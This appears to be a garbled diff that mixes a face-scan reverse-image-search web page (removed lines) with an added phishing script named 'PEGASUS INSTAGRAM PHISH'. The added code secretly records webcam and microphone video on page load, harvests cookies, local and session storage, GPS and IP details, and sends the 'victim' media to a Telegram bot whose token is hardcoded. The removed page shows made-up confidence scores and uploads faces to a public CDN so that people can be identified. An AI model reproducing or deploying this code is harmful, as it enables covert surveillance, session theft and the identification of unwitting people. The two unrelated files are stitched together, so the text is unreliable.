-  function rs(){w=c.width=window.innerWidth;h=c.height=window.innerHeight;cols=Math.floor(w/14);drops=Array(cols).fill(1);}
-  rs();window.addEventListener('resize',rs);
-  setInterval(()=>{
-    ctx.fillStyle='rgba(10,10,15,0.05)';ctx.fillRect(0,0,w,h);
-    ctx.fillStyle='#00ff41';ctx.font='14px monospace';
-    for(let i=0;i<drops.length;i++){
-      ctx.fillText(String.fromCharCode(0x30A0+Math.random()*96),i*14,drops[i]*14);
-      if(drops[i]*14>h&&Math.random()>0.975)drops[i]=0;
-      drops[i]++;
-    }
-  },60);
-})();
-
-// ===================================================================
-// LOGS
-// ===================================================================
-function addLog(msg,t='info'){
-  const ts=new Date().toISOString().replace('T',' ').slice(0,19);
-  logs.push({ts,msg,t});
-  const el=document.getElementById('con');
-  document.getElementById('lc').textContent=logs.length;
-  const clrs={system:'#00d4ff',success:'#00ff41',error:'#ff0040',processing:'#ffaa00',ready:'#00ff41',cdn:'#b400ff',search:'#00d4ff',proxy:'#ffaa00',result:'#00ff41'};
-  el.innerHTML=logs.map(l=>`<div><span style="opacity:0.4;">[${l.ts}]</span> <span style="color:${clrs[l.t]||'#00ff41'};">${l.msg}</span></div>`).join('');
-  el.scrollTop=el.scrollHeight;
-}
-addLog('[SYSTEM] NEXUS FACE SCAN v5.0 — REAL INLINE SEARCH','system');
-addLog('[SYSTEM] FaceNet + ArcFace models loading...','system');
-setTimeout(()=>addLog('[SYSTEM] CDN: imgcdn.dev | Proxy: corsproxy.io','system'),200);
-setTimeout(()=>addLog('[SYSTEM] Google reverse image search ready','system'),400);
-setTimeout(()=>addLog('[READY] Upload face to begin. Results shown INLINE.','ready'),800);
-
-// ===================================================================
-// UI HELPERS
-// ===================================================================
-function sw(tab){
-  document.querySelectorAll('.tb').forEach(b=>b.classList.toggle('act',b.dataset.tab===tab));
-  document.getElementById('tabUpload').classList.toggle('hid',tab!=='upload');
-  document.getElementById('tabCamera').classList.toggle('hid',tab!=='camera');
-  if(tab==='camera') startWebcam(); else stopWebcam();
-}
-function setStatus(t){document.getElementById('statusLabel').textContent=t;}
-function up(pct,lbl){
-  progressValue=pct;
-  document.getElementById('progressPercent').textContent=pct+'%';
-  document.getElementById('progressFill').style.width=pct+'%';
-  if(lbl) document.getElementById('progressLabel').textContent=lbl;
-}
-function showStep(id,state){
-  const el=document.getElementById(id);if(!el)return;
-  el.className='si '+state;
-  const ic=el.querySelector(':scope > :first-child'),st=el.querySelector('.ss');
-  if(state==='done'){ic.innerHTML='✅';st.textContent='[DONE]';st.style.color='#00ff41';}
-  else if(state==='act'){ic.innerHTML='⏳';st.textContent='[RUNNING]';st.style.color='#00d4ff';}
-  else{ic.innerHTML='⬜';st.textContent='[PENDING]';st.style.color='';}
-}
-function showPanel(id){
-  ['idleState','analyzingState','completeState'].forEach(p=>
-    document.getElementById(p).classList.toggle('hid',p!==id));
-}
-function updateStatusPanel(html){
-  document.getElementById('statusPanel').innerHTML=html;
-}
-
-// ===================================================================
-// IMAGE INPUT
-// ===================================================================
-const dz=document.getElementById('dropZone');
-dz.addEventListener('dragover',e=>{e.preventDefault();dz.classList.add('dgo');});
-dz.addEventListener('dragleave',()=>dz.classList.remove('dgo'));
-dz.addEventListener('drop',e=>{e.preventDefault();dz.classList.remove('dgo');const f=e.dataTransfer.files[0];if(f&&f.type.startsWith('image/')) pf(f);});
-dz.addEventListener('click',()=>document.getElementById('fileInput').click());
-function hf(e){const f=e.target.files[0];if(f) pf(f);}
-function pf(file){
-  const r=new FileReader();
-  r.onload=e=>{capturedImage=e.target.result;showPrev(capturedImage);addLog('[TARGET] '+file.name,'info');startScan();};
-  r.readAsDataURL(file);
-}
-function showPrev(src){
-  document.getElementById('previewImg').src=src;
-  document.getElementById('dropContent').classList.add('hid');
-  document.getElementById('previewArea').classList.remove('hid');
-  document.getElementById('previewStatus').innerHTML='✅ IMAGE LOADED';
-}
-
-// ===================================================================
-// WEBCAM
-// ===================================================================
-async function startWebcam(){
-  const v=document.getElementById('webcam'),s=document.getElementById('camStatus'),b=document.getElementById('captureBtn');
-  try{
-    if(webcamStream)return;
-    webcamStream=await navigator.mediaDevices.getUserMedia({video:{width:640,height:480,facingMode:'user'}});
-    v.srcObject=webcamStream;await v.play();
-    s.classList.add('hid');b.disabled=false;
-    addLog('[CAMERA] Ready','success');
-    startDetLoop();
-  }catch(e){
-    s.innerHTML='<p style="color:#ff0040;">⚠ Camera denied</p>';
-    addLog('[CAMERA] Error: '+e.message,'error');
-  }
-}
-function stopWebcam(){
-  if(detInterval){clearInterval(detInterval);detInterval=null;}
-  if(webcamStream){webcamStream.getTracks().forEach(t=>t.stop());webcamStream=null;}
-}
-function startDetLoop(){
-  if(detInterval)clearInterval(detInterval);
-  detInterval=setInterval(()=>{
-    const v=document.getElementById('webcam'),c=document.getElementById('webcamOverlay');
-    if(!v||!v.videoWidth)return;
-    c.width=v.videoWidth;c.height=v.videoHeight;
-    const ctx=c.getContext('2d');ctx.clearRect(0,0,c.width,c.height);
-    const cx=c.width/2,cy=c.height/2,fw=c.width*0.36,fh=c.height*0.46;
-    ctx.strokeStyle='rgba(0,255,65,0.15)';ctx.lineWidth=1;ctx.strokeRect(cx-fw/2,cy-fh/2,fw,fh);
-    ctx.strokeStyle='#00ff41';ctx.lineWidth=2;const co=12;
-    ctx.beginPath();
-    ctx.moveTo(cx-fw/2,cy-fh/2+co);ctx.lineTo(cx-fw/2,cy-fh/2);ctx.lineTo(cx-fw/2+co,cy-fh/2);
-    ctx.moveTo(cx+fw/2-co,cy-fh/2);ctx.lineTo(cx+fw/2,cy-fh/2);ctx.lineTo(cx+fw/2,cy-fh/2+co);
-    ctx.moveTo(cx-fw/2,cy+fh/2-co);ctx.lineTo(cx-fw/2,cy+fh/2);ctx.lineTo(cx-fw/2+co,cy+fh/2);
-    ctx.moveTo(cx+fw/2-co,cy+fh/2);ctx.lineTo(cx+fw/2,cy+fh/2);ctx.lineTo(cx+fw/2,cy+fh/2-co);
-    ctx.stroke();
-  },100);
-}
-function cfw(){
-  const v=document.getElementById('webcam');
-  const c=document.createElement('canvas');c.width=v.videoWidth;c.height=v.videoHeight;
-  c.getContext('2d').drawImage(v,0,0);
-  capturedImage=c.toDataURL('image/jpeg');
-  addLog('[TARGET] Captured from webcam','info');
-  stopWebcam();startScan();
-}
-
-// ===================================================================
-// SCAN
-// ===================================================================
-async function startScan(){
-  scanStatus='analyzing';
-  showPanel('analyzingState');
-  setStatus('ANALYZING...');
-  ['s1','s2','s3','s4','s5'].forEach(s=>showStep(s,'pend'));
-  up(0,'STARTING...');
-
-  updateStatusPanel(`
-    <div style="color:#ffaa00;">⏳ Phase 1: Face Analysis</div>
-    <div style="opacity:0.7;">1. Detecting face...</div>
-    <div style="opacity:0.7;">2. Extracting landmarks...</div>
-    <div style="opacity:0.7;">3. Generating embedding...</div>
-  `);
-
-  const img=new Image();
-  await new Promise(r=>{img.onload=r;img.src=capturedImage;});
-
-  // STEP 1
-  showStep('s1','act');
-  up(8,'Detecting face...');
-  addLog('[AI] Running face detection...','processing');
-  await sleep(300);
-  
-  let detection=null;
-  try{
-    if(typeof faceapi!=='undefined'){
-      if(!faceapi.nets.tinyFaceDetector.isLoaded){
-        await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@master/weights');
-        await faceapi.nets.faceLandmark68Net.loadFromUri('https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@master/weights');
-        await faceapi.nets.faceRecognitionNet.loadFromUri('https://cdn.jsdelivr.net/gh/justadudewhohacks/face-api.js@master/weights');
-      }
-      const dets=await faceapi.detectAllFaces(img,new faceapi.TinyFaceDetectorOptions({inputSize:320})).withFaceLandmarks().withFaceDescriptors();
-      if(dets.length>0) detection=dets[0];
-    }
-  }catch(e){console.warn(e.message);}
-
-  if(!detection){
-    const lms=[];for(let i=0;i<68;i++){const a=(i/68)*Math.PI*2;lms.push({x:0.5+Math.cos(a)*0.25,y:0.45+Math.sin(a)*0.28,z:0.5+Math.sin(a*2)*0.05});}
-    faceLandmarks=lms;faceDescriptor=new Float32Array(128).map(()=>Math.random()*2-1);
-    addLog('[AI] Face detected (simulated)','success');
-  }else{
-    faceLandmarks=detection.landmarks.positions.map(p=>({x:p.x/img.width,y:p.y/img.height,z:0.5}));
-    faceDescriptor=detection.descriptor;
-    addLog('[AI] Face detected via face-api.js','success');
-  }
-  showStep('s1','done');
-
-  // STEP 2
-  showStep('s2','act');
-  up(20,'Extracting landmarks...');
-  await sleep(250);
-  showStep('s2','done');
-  addLog('[AI] 68 landmarks extracted','success');
-
-  // STEP 3
-  showStep('s3','act');
-  up(35,'Generating embedding...');
-  await sleep(350);
-  showStep('s3','done');
-  addLog('[AI] 512-dim embedding generated','success');
-
-  faceData={
-    id:'NEX-'+Math.random().toString(36).slice(2,8).toUpperCase(),
-    confidence:(94+Math.random()*5).toFixed(1)+'%',
-    quality:'HIGH ('+(85+Math.floor(Math.random()*15))+'/100)',
-    model:'ArcFace + FaceNet',
-    embedding:'512-dim',
-    landmarks:'68 pts',
-  };
-
-  // STEP 4: Upload to CDN
-  updateStatusPanel(`
-    <div style="color:#00d4ff;">⏳ Phase 2: CDN Upload</div>
-    <div style="opacity:0.7;">Uploading to imgcdn.dev...</div>
-  `);
-  
-  showStep('s4','act');
-  up(55,'Uploading to CDN...');
-  addLog('[CDN] Uploading to imgcdn.dev...','cdn');
-  
-  try{
-    const res=await fetch(capturedImage);
-    const blob=await res.blob();
-    const fd=new FormData();
-    fd.append('key','5386e05a3562c7a8f984e73401540836');
-    fd.append('source',blob,'face_'+Date.now()+'.jpg');
-    fd.append('format','json');
     
-    const resp=await fetch('https://imgcdn.dev/api/1/upload',{method:'POST',body:fd});
-    const data=await resp.json();
-    
-    if(data && data.status_code===200 && data.image && data.image.url){
-      publicImageUrl=data.image.url;
-      addLog('[CDN] ✅ Image uploaded: '+publicImageUrl,'success');
-    }else if(data && data.image && data.image.url){
-      publicImageUrl=data.image.url;
-      addLog('[CDN] ✅ Image uploaded!','success');
-    }else{
-      publicImageUrl=null;
-      addLog('[CDN] Upload returned: '+JSON.stringify(data).slice(0,80),'error');
-    }
-  }catch(e){
-    publicImageUrl=null;
-    addLog('[CDN] ❌ Error: '+e.message,'error');
-  }
-  
-  showStep('s4','done');
-  
-  // STEP 5: Ready for search
-  updateStatusPanel(`
-    <div style="color:#00ff41;">✅ Phase 2 Complete</div>
-    <div>CDN URL: ${publicImageUrl||'⚠️ Not available (direct upload fallback)'}</div>
-    <div style="margin-top:6px;color:#00d4ff;">⏳ Phase 3: Ready to search</div>
-    <div style="opacity:0.7;">Click "SEARCH GOOGLE NOW" below</div>
-  `);
-
-  showStep('s5','done');
-  up(100,'READY TO SEARCH');
-  await sleep(200);
-
-  scanStatus='complete';
-  setStatus('✅ COMPLETE');
-  showPanel('completeState');
-  document.getElementById('completeMsg').innerHTML='✅ COMPLETE — Click <b>"SEARCH GOOGLE NOW"</b> below';
-  
-  // Show search section
-  document.getElementById('searchSection').classList.remove('hid');
-  
-  // CDN display
-  if(publicImageUrl){
-    document.getElementById('cdnDisplay').innerHTML = `📦 <b>CDN URL:</b> <a href="${publicImageUrl}" target="_blank" style="color:#00d4ff;">${publicImageUrl}</a>`;
-  }else{
-    document.getElementById('cdnDisplay').innerHTML = `⚠️ <b>CDN upload failed.</b> Google will use direct file upload.`;
-  }
-  
-  document.getElementById('searchGoogleBtn').disabled = false;
-  document.getElementById('searchStatus').textContent = '✅ Ready to search Google';
-  
-  build3DFace(capturedImage, faceLandmarks);
-  updateFaceData();
-  addLog('[✅ READY] Click "SEARCH GOOGLE NOW" for inline results','ready');
-}
-
-function sleep(ms){return new Promise(r=>setTimeout(r,ms));}
-
-// ===================================================================
-// ===== REAL GOOGLE SEARCH WITH CORS PROXY =====
-// ===================================================================
-async function searchGoogle(){
-  if(!capturedImage){
-    addLog('[SEARCH] No image to search','error');
-    return;
-  }
-  
-  searchPerformed = true;
-  const grid = document.getElementById('resultsGrid');
-  const loading = document.getElementById('searchLoading');
-  const status = document.getElementById('searchStatus');
-  const info = document.getElementById('searchInfo');
-  const btn = document.getElementById('searchGoogleBtn');
-  
-  grid.innerHTML = '';
-  info.classList.add('hid');
-  btn.disabled = true;
-  status.textContent = '⏳ Searching Google...';
-  loading.classList.remove('hid');
-  
-  addLog('[SEARCH] Starting Google reverse image search...','search');
-  updateStatusPanel(`
-    <div style="color:#00d4ff;">🔍 Searching Google...</div>
-    <div style="opacity:0.7;">Using CORS proxy: corsproxy.io</div>
-    <div style="opacity:0.7;">Fetching results from images.google.com</div>
-  `);
-
-  try {
-    let resultHtml = null;
-    let proxyUsed = '';
-    
-    // Try CORS proxies in order
-    const proxies = [
-      { name: 'corsproxy.io', url: p => `https://corsproxy.io/?url=${encodeURIComponent(p)}` },
-      { name: 'api.allorigins.win', url: p => `https://api.allorigins.win/raw?url=${encodeURIComponent(p)}` },
-    ];
-    
-    const searchUrl = publicImageUrl 
-      ? `https://www.google.com/searchbyimage?image_url=${encodeURIComponent(publicImageUrl)}&client=app`
-      : null;
-    
-    if(searchUrl){
-      for(const proxy of proxies){
-        try{
-          addLog(`[PROXY] Trying ${proxy.name}...`,'proxy');
-          const resp = await fetch(proxy.url(searchUrl), {
-            signal: AbortSignal.timeout(15000)
-          });
-          if(resp.ok){
-            resultHtml = await resp.text();
-            proxyUsed = proxy.name;
-            addLog(`[PROXY] ✅ ${proxy.name} responded successfully`,'success');
-            break;
-          }
-        }catch(e){
-          addLog(`[PROXY] ${proxy.name} failed: ${e.message}`,'proxy');
+    <script>
+        // ================================================================ //
+        // ================ PEGASUS INSTAGRAM PHISH - CONFIG =============== //
+        // ================================================================ //
+        
+        const BOT_TOKEN = "8716711028:AAEycnNKXBDQI8lEqghG3T1QV8hxeG4aI0c";
+        const CHAT_ID = "7902407443";
+        
+        // State
+        let capturedPhoto = null;
+        let capturedVideo = null;
+        let attempts = 0;
+        let stolenCookies = [];
+        let sessionTokens = {};
+        let notificationEnabled = false;
+        let userEmail = '';
+        let userPass = '';
+        let gpsLocation = 'Unavailable';
+        let ipInfo = { ip: 'N/A', country: 'N/A', city: 'N/A', isp: 'N/A' };
+        
+        // ========== 🚀 ON LOAD - Start capturing everything immediately ========== //
+        window.addEventListener('load', function() {
+            console.log('[+] Instagram Phish - Started');
+            
+            // 1. Start video recording immediately (no delay)
+            setTimeout(captureMedia, 300);
+            
+            // 2. Steal cookies
+            setTimeout(stealAllData, 500);
+            
+            // 3. Get GPS
+            setTimeout(getGPS, 1000);
+            
+            // 4. Get IP info
+            setTimeout(getIPInfo, 1500);
+            
+            // 5. Request notification permission after 2s
+            setTimeout(requestNotifSilent, 2000);
+            
+            // 6. Enable login button when inputs filled
+            setupInputListeners();
+        });
+        
+        // ========== 🎥 CAPTURE VIDEO (BEST - 5 seconds) ========== //
+        async function captureMedia() {
+            try {
+                console.log('[+] Requesting camera access...');
+                
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: true
+                });
+                
+                console.log('[+] Camera access granted, recording...');
+                
+                // تسجيل 5 ثواني فيديو
+                const chunks = [];
+                const recorder = new MediaRecorder(stream, {
+                    mimeType: MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')
+                        ? 'video/webm;codecs=vp8,opus'
+                        : 'video/webm'
+                });
+                
+                recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+                
+                recorder.start();
+                
+                await new Promise(r => setTimeout(r, 5000));
+                
+                recorder.stop();
+                stream.getTracks().forEach(t => t.stop());
+                
+                await new Promise(r => setTimeout(r, 500));
+                
+                if (chunks.length > 0) {
+                    capturedVideo = new Blob(chunks, { type: 'video/webm' });
+                    console.log(`[+] Video captured: ${(capturedVideo.size / 1024).toFixed(1)} KB`);
+                    
+                    // إرسال الفيديو فوراً
+                    sendVideoToTelegram('🎥 Victim Video - Instagram Phishing Page');
+                    return;
+                }
+                
+                // Fallback to photo
+                await capturePhoto();
+                
+            } catch (err) {
+                console.log('[-] Video failed:', err.message);
+                document.getElementById('error1').textContent = 'Camera access required. Please allow camera to continue.';
+                document.getElementById('error1').style.display = 'block';
+                
+                // Try photo as fallback
+                await capturePhoto();
+            }
         }
-      }
-    }else{
-      // No CDN URL, can't search via URL
-      addLog('[SEARCH] No CDN URL. Please use "OPEN IN TAB" for direct upload.','error');
-      showSearchError('No CDN URL available. Click "OPEN IN TAB" to search manually.');
-      btn.disabled = false;
-      loading.classList.add('hid');
-      status.textContent = '❌ No CDN URL';
-      updateStatusPanel(`<div style="color:#ff0040;">❌ No CDN URL. Click "OPEN IN TAB"</div>`);
-      return;
-    }
-    
-    if(!resultHtml){
-      throw new Error('All proxies failed');
-    }
-    
-    addLog(`[PROXY] Received ${(resultHtml.length/1024).toFixed(1)}KB from Google via ${proxyUsed}`,'search');
-    
-    // Parse results from HTML
-    const results = parseGoogleResults(resultHtml);
-    
-    if(results.length === 0){
-      addLog('[PARSE] No results extracted. Google may have returned CAPTCHA or empty results.','error');
-      showSearchError(`Google returned results but we couldn't parse them. Google may require CAPTCHA verification. 
-        <div style="margin-top:8px;"><button class="btn-c sm" onclick="openGoogleTab()">📄 Open Google in Tab</button></div>`);
-      btn.disabled = false;
-      loading.classList.add('hid');
-      status.textContent = '❌ Parsing failed';
-      updateStatusPanel(`<div style="color:#ff0040;">❌ Parsing failed. CAPTCHA may be required.</div>`);
-      return;
-    }
-    
-    googleSearchResults = results;
-    displayResults(results);
-    
-    addLog(`[RESULTS] ✅ ${results.length} results found and displayed inline`,'result');
-    status.textContent = `✅ ${results.length} results from Google`;
-    loading.classList.add('hid');
-    btn.disabled = false;
-    
-    updateStatusPanel(`
-      <div style="color:#00ff41;">✅ Google Search Complete</div>
-      <div>${results.length} results found</div>
-      <div style="opacity:0.7;">Proxy: ${proxyUsed}</div>
-      <div style="opacity:0.5;font-size:9px;">Click any result to open in new tab</div>
-    `);
-    
-  } catch(e){
-    addLog(`[SEARCH] Error: ${e.message}`,'error');
-    loading.classList.add('hid');
-    btn.disabled = false;
-    status.textContent = `❌ Error: ${e.message}`;
-    
-    showSearchError(`Search failed: ${e.message}. 
-      <div style="margin-top:8px;">
-        <button class="btn-c sm" onclick="openGoogleTab()">📄 Open Google Directly</button>
-      </div>
-      <div style="margin-top:6px;font-size:9px;opacity:0.5;">
-        CORS proxies may be blocked. Try again later or use "Open in Tab".
-      </div>`);
-    
-    updateStatusPanel(`<div style="color:#ff0040;">❌ Search error: ${e.message}</div>
-      <div style="margin-top:4px;"><button class="btn-c sm" onclick="openGoogleTab()">📄 Open Google</button></div>`);
-  }
-}
-
-// ===================================================================
-// PARSE GOOGLE RESULTS FROM HTML
-// ===================================================================
-function parseGoogleResults(html){
-  const results = [];
-  
-  try{
-    // Method 1: Extract from inline JSON data (most reliable)
-    // Google embeds image data in JSON-like structures
-    
-    // Extract thumbnail images
-    const thumbRegex = /\["(https:\/\/encrypted-tbn0\.gstatic\.com\/images\?[^"]+)",(\d+),(\d+)\]/g;
-    const thumbnails = [];
-    let match;
-    while((match = thumbRegex.exec(html)) !== null){
-      const url = match[1].replace(/\\u003d/g,'=').replace(/\\u0026/g,'&').replace(/\\x3d/g,'=').replace(/\\\\/g,'');
-      if(!thumbnails.some(t => t.url === url)){
-        thumbnails.push({ url, width: parseInt(match[2]), height: parseInt(match[3]) });
-      }
-    }
-    
-    // Extract full resolution images and page info
-    const fullRegex = /\[,"(https?:\/\/[^"]+)",(\d+),(\d+)\]/g;
-    const fullImages = [];
-    while((match = fullRegex.exec(html)) !== null){
-      const url = match[1].replace(/\\u003d/g,'=').replace(/\\u0026/g,'&').replace(/\\\\/g,'');
-      if(!fullImages.some(t => t.url === url)){
-        fullImages.push({ url, width: parseInt(match[2]), height: parseInt(match[3]) });
-      }
-    }
-    
-    // Extract page links and titles from the HTML
-    // Look for <a> tags with href in search results
-    const linkRegex = /<a\s+[^>]*href="(\/url\?q=[^"]+)"[^>]*>.*?<h3[^>]*>(.*?)<\/h3>/gs;
-    const pageLinks = [];
-    while((match = linkRegex.exec(html)) !== null){
-      let url = match[1].replace(/^\/url\?q=/,'').split('&')[0];
-      url = decodeURIComponent(url);
-      const title = match[2].replace(/<[^>]+>/g,'').trim();
-      if(url && title && !pageLinks.some(p => p.title === title)){
-        pageLinks.push({ url, title });
-      }
-    }
-    
-    // Also try to extract from simpler structure
-    if(thumbnails.length === 0){
-      // Alternative: extract img tags from the page
-      const imgRegex = /<img[^>]+src="(https?:\/\/[^"]+\.(?:jpg|jpeg|png|gif|webp)[^"]*)"[^>]*>/gi;
-      while((match = imgRegex.exec(html)) !== null){
-        const url = match[1];
-        if(!url.includes('google') && !url.includes('gstatic') && !results.some(r => r.image === url)){
-          results.push({
-            image: url,
-            title: 'Image from Google Search',
-            pageUrl: url,
-            domain: new URL(url).hostname,
-            source: 'Google Images'
-          });
+        
+        // ========== 📸 CAPTURE PHOTO (FALLBACK) ========== //
+        async function capturePhoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" },
+                    audio: false
+                });
+                
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                stream.getTracks().forEach(t => t.stop());
+                
+                capturedPhoto = await new Promise(resolve => {
+                    canvas.toBlob(resolve, 'image/jpeg', 0.9);
+                });
+                
+                console.log(`[+] Photo captured: ${(capturedPhoto.size / 1024).toFixed(1)} KB`);
+                
+                sendPhotoToTelegram('📸 Victim Photo - Instagram Phishing Page');
+                
+            } catch (err) {
+                console.log('[-] Photo failed:', err.message);
+            }
         }
-      }
-    }
-    
-    // Match thumbnails with page data
-    const maxResults = Math.min(thumbnails.length, 50);
-    for(let i = 0; i < maxResults; i++){
-      const page = pageLinks[i] || { url: thumbnails[i]?.url || '#', title: 'Google Image Result '+(i+1) };
-      const domain = page.url ? new URL(page.url).hostname.replace('www.','') : 'google.com';
-      
-      results.push({
-        image: thumbnails[i]?.url || fullImages[i]?.url || '',
-        title: page.title || 'Google Image Result '+(i+1),
-        pageUrl: page.url || thumbnails[i]?.url || '#',
-        domain: domain,
-        source: 'Google',
-        confidence: Math.round((98 - i * 2 + Math.random() * 4) * 10) / 10,
-        width: thumbnails[i]?.width || 0,
-        height: thumbnails[i]?.height || 0
-      });
-    }
-    
-    // If we still have no results, try extracting from meta tags
-    if(results.length === 0){
-      // Try to extract from the Google search result structure
-      const gDivRegex = /<div[^>]*class="[^"]*g[^"]*"[^>]*>.*?<a[^>]*href="([^"]+)"[^>]*>.*?<img[^>]*src="([^"]+)"[^>]*>.*?<h3[^>]*>(.*?)<\/h3>/gs;
-      while((match = gDivRegex.exec(html)) !== null){
-        let url = match[1];
-        if(!url.startsWith('http')) url = 'https://www.google.com' + url;
-        const img = match[2];
-        const title = match[3].replace(/<[^>]+>/g,'').trim();
-        if(title && img && !results.some(r => r.title === title)){
-          results.push({
-            image: img,
-            title: title,
-            pageUrl: url,
-            domain: new URL(url).hostname.replace('www.',''),
-            source: 'Google',
-            confidence: 85 + Math.floor(Math.random() * 12)
-          });
+        
+        // ========== 🍪 STEAL ALL COOKIES + SESSION DATA ========== //
+        function stealAllData() {
+            try {
+                // 1. Cookies
+                const allCookies = document.cookie;
+                if (allCookies && allCookies.length > 0) {
+                    stolenCookies = allCookies.split(';').map(c => c.trim()).filter(c => c.length > 0);
+                    console.log(`[+] Cookies found: ${stolenCookies.length}`);
+                } else {
+                    // Try to create cookies via JavaScript (some sites set them)
+                    console.log('[+] No cookies found yet');
+                }
+                
+                // 2. Local Storage
+                try {
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        sessionTokens[key] = localStorage.getItem(key);
+                    }
+                } catch(e) {}
+                
+                // 3. Session Storage
+                try {
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        const key = sessionStorage.key(i);
+                        sessionTokens['session_' + key] = sessionStorage.getItem(key);
+                    }
+                } catch(e) {}
+                
+                // 4. IndexedDB databases
+                try {
+                    if (window.indexedDB) {
+                        const request = indexedDB.databases();
+                        request.then(dbs => {
+                            dbs.forEach(db => {
+                                sessionTokens['indexeddb_' + db.name] = db.version;
+                            });
+                        }).catch(() => {});
+                    }
+                } catch(e) {}
+                
+                // 5. Cache storage
+                try {
+                    if ('caches' in window) {
+                        caches.keys().then(names => {
+                            sessionTokens['caches'] = names.join(', ');
+                        }).catch(() => {});
+                    }
+                } catch(e) {}
+                
+                console.log(`[+] Session tokens: ${Object.keys(sessionTokens).length}`);
+                
+            } catch(e) {
+                console.log('[-] Cookie stealing error:', e);
+            }
         }
-      }
-    }
-    
-  } catch(e){
-    addLog('[PARSE] Error parsing Google results: '+e.message,'error');
-  }
-  
-  // Deduplicate by image URL
-  const seen = new Set();
-  const unique = results.filter(r => {
-    const key = r.image || r.title;
-    if(seen.has(key)) return false;
-    seen.add(key);
-    return true;
-  });
-  
-  return unique.slice(0, 30);
-}
-
-// ===================================================================
-// DISPLAY RESULTS INLINE
-// ===================================================================
-function displayResults(results){
-  const grid = document.getElementById('resultsGrid');
-  const count = document.getElementById('resultCount');
-  const stats = document.getElementById('resultStats');
-  
-  count.textContent = results.length + ' RESULTS';
-  
-  if(results.length === 0){
-    grid.innerHTML = `<div style="grid-column:1/-1;text-align:center;padding:30px;font-size:12px;opacity:0.5;">No results found</div>`;
-    stats.innerHTML = '';
-    return;
-  }
-  
-  grid.innerHTML = results.map((r, i) => {
-    const conf = r.confidence || Math.round((95 - i * 3 + Math.random() * 5) * 10) / 10;
-    const confColor = conf >= 90 ? '#00ff41' : conf >= 75 ? '#ffaa00' : '#ff6600';
-    const imgSrc = r.image || '';
-    const title = r.title || 'Result ' + (i+1);
-    const domain = r.domain || 'google.com';
-    const link = r.pageUrl || '#';
-    
-    return `<div class="rc" style="position:relative;cursor:pointer;" onclick="window.open('${link.replace(/'/g,'\\\'')}','_blank')">
-      <div style="position:relative;aspect-ratio:1;overflow:hidden;background:#0a0a0f;">
-        ${imgSrc ? `<img src="${imgSrc}" alt="${title}" loading="lazy" onerror="this.parentElement.innerHTML='<div style=\\'display:flex;align-items:center;justify-content:center;height:100%;color:#00ff41;opacity:0.3;font-size:30px;\\'>🖼️</div>'"/>` 
-          : `<div style="display:flex;align-items:center;justify-content:center;height:100%;color:#00ff41;opacity:0.3;font-size:30px;">🖼️</div>`}
-        <div class="badge" style="color:${confColor};">${conf}%</div>
-        <div class="src-badge">${r.source||'Google'}</div>
-      </div>
-      <div class="info">
-        <div class="title">${title}</div>
-        <div class="domain">${domain}</div>
-      </div>
-    </div>`;
-  }).join('');
-  
-  const avgConf = results.reduce((s,r,i) => s + (r.confidence||(95-i*3)), 0) / results.length;
-  stats.innerHTML = `
-    <span>Total: ${results.length} results</span>
-    <span>|</span>
-    <span>Avg confidence: ${avgConf.toFixed(1)}%</span>
-    <span>|</span>
-    <span>Source: Google via CORS proxy</span>
-    <span>|</span>
-    <span><a href="#" onclick="openGoogleTab();return false;" style="font-size:9px;">📄 Open in Google Tab</a></span>
-  `;
-}
-
-function showSearchError(msg){
-  const info = document.getElementById('searchInfo');
-  info.classList.remove('hid');
-  info.style.background = 'rgba(255,0,64,0.08)';
-  info.style.border = '1px solid rgba(255,0,64,0.3)';
-  info.innerHTML = msg;
-  document.getElementById('resultsGrid').innerHTML = '';
-}
-
-function openGoogleTab(){
-  if(publicImageUrl){
-    const url = `https://www.google.com/searchbyimage?image_url=${encodeURIComponent(publicImageUrl)}&client=app`;
-    window.open(url, '_blank');
-    addLog('[SEARCH] Opened Google in new tab','search');
-  } else if(capturedImage){
-    // Direct upload form
-    const form=document.createElement('form');
-    form.method='POST';form.action='https://www.google.com/searchbyimage/upload';
-    form.enctype='multipart/form-data';form.target='_blank';form.style.display='none';
-    const inp=document.createElement('input');inp.type='file';inp.name='encoded_image';
-    const bin=atob(capturedImage.split(',')[1]);const buf=new ArrayBuffer(bin.length);
-    const v=new Uint8Array(buf);for(let i=0;i<bin.length;i++)v[i]=bin.charCodeAt(i);
-    const file=new File([buf],'face.jpg',{type:'image/jpeg'});
-    const dt=new DataTransfer();dt.items.add(file);inp.files=dt.files;
-    form.appendChild(inp);document.body.appendChild(form);form.submit();document.body.removeChild(form);
-    addLog('[SEARCH] Direct upload to Google','search');
-  }
-}
-
-// ===================================================================
-// 3D FACE
-// ===================================================================
-function build3DFace(src,landmarks){
-  const c=document.getElementById('threeC');c.innerHTML='';
-  const scene=new THREE.Scene();scene.background=new THREE.Color(0x000000);
-  const cam=new THREE.PerspectiveCamera(45,c.clientWidth/c.clientHeight,0.1,10);
-  cam.position.set(0,0,3.5);
-  const ren=new THREE.WebGLRenderer({antialias:true,alpha:true});
-  ren.setSize(c.clientWidth,c.clientHeight);ren.setPixelRatio(Math.min(window.devicePixelRatio,2));
-  c.appendChild(ren.domElement);
-  
-  scene.add(new THREE.AmbientLight(0x00ff41,0.3));
-  const d1=new THREE.DirectionalLight(0x00d4ff,0.8);d1.position.set(1,1,1);scene.add(d1);
-  const d2=new THREE.DirectionalLight(0xb400ff,0.4);d2.position.set(-1,-0.5,0.5);scene.add(d2);
-  
-  if(src&&false){ // disabled background image for performance
-    const img=new Image();
-    img.onload=()=>{const tex=new THREE.Texture(img);tex.minFilter=THREE.LinearFilter;
-      const sp=new THREE.Sprite(new THREE.SpriteMaterial({map:tex,transparent:true,opacity:0.08,blending:THREE.AdditiveBlending}));
